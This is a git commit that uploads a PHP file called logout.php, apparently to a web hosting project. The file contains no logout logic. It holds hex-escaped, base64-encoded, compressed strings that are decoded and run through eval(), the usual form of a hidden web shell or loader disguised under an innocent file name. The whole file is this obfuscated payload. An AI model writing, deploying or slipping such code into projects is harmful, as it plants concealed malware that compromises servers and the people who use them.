a4cd483e7decc71cc12ef122c694852fb450bcb2
webhostProject <86317362+webhostProject@users.noreply.github.com>
2023-12-03 23:18:08 +0530

    Add files via upload

---
+++ IND/NP/JP/CN/logout.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "j\x432pgHgWF\x43\x62GT5H7\x62wE8V\x2bx9LzGZFG\x2bqh2j\x61hGuWuT\x2b0Uk\x2bVNymHgHfxmJv\x430X\x62\x42Dtuo1\x63PYlV\x62\x412NZ6\x63miu3w53rjt\x426GDK7mtmRRgD\x41zjdivIXZVkmJHlX\x42Jon\x418D\x43EPYKV4MDyumGGX\x2b0Qilkq\x43uoSph277V\x62ZuHn3vTSGZy97vwsZEDhow8wkpSwLYVw\x43Kov0\x62MxEmyh9X4\x2bF\x42\x42Q\x43rwuPW0/r\x42\x41l\x42wJe/DG\x41fGw/\x62\x42\x41p\x42wJe/DF\x41vGw/L\x42\x41t\x42wJe/DE\x41/Gw/7\x41\x41x\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
